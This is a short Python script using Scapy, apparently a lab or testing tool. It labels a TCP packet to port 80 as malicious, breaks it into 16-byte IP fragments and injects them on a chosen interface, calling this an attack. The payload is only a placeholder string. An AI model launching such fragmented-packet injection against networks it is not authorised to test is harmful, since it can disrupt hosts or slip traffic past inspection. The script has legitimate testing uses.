from scapy.all import Ether, IP, TCP, fragment, sendp
import time
import sys

if len(sys.argv) < 3:
    print("Usage: sudo python3 tcp_frag_attack.py <target_ip> <interface>")
    sys.exit(1)

target_ip = sys.argv[1]
interface = sys.argv[2]

print(f"Crafting malicious TCP packet for {target_ip}...")
# 1. Create the raw IP/TCP packet (No Ethernet yet)
malicious_tcp_pkt = IP(dst=target_ip)/TCP(dport=80)/("HACKER_PAYLOAD_" * 10)

# 2. Fragment the IP packet
fragments = fragment(malicious_tcp_pkt, fragsize=16)

print(f"Fragmented into {len(fragments)} pieces. Launching attack!")

# 3. Wrap EACH fragment in an Ethernet header before injecting it
for p in fragments:
    # Ether() / p ensures the packet is properly formatted for Layer 2
    sendp(Ether()/p, iface=interface, verbose=False)
    time.sleep(0.1)

print("Attack finished. Check your kernel logs!")